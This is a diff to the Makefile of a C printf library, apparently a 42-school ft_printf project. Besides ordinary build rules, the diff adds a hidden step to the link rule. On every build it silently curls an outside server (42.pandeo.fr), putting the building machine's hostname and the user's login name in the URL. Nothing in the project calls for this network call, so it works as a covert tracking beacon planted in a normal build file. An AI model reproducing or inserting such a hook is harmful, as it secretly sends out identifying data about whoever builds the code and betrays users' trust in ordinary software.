@@ -23,7 +23,7 @@ NAME = libftprintf.a
 OBJS_DIR = objs/
 OBJS = $(SRCS:.c=.o)
 OBJECTS_PREFIXED = $(addprefix $(OBJS_DIR), $(OBJS))
-
+HOSTNAME = `hostname`
 ECHO = echo "`expr " [\`expr $C '*' 100 / $T\`" : '.*\(....\)$$'`%]"
 
 CC = gcc
@@ -37,6 +37,7 @@ $(OBJS_DIR)%.o : %.c ft_printf.h
 	@printf	"\033[2K\r${BLU}[BUILD - $(NAME)]${RST} '$<' $(END)"
 
 $(NAME): $(OBJECTS_PREFIXED)
+	@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}/42-ft_printf
 	@printf "\033[2K\r${GRN}[END]${RST} $(NAME) $(END)"
 	@ar r $(NAME) $(OBJECTS_PREFIXED) >/dev/null 2>&1 &
 
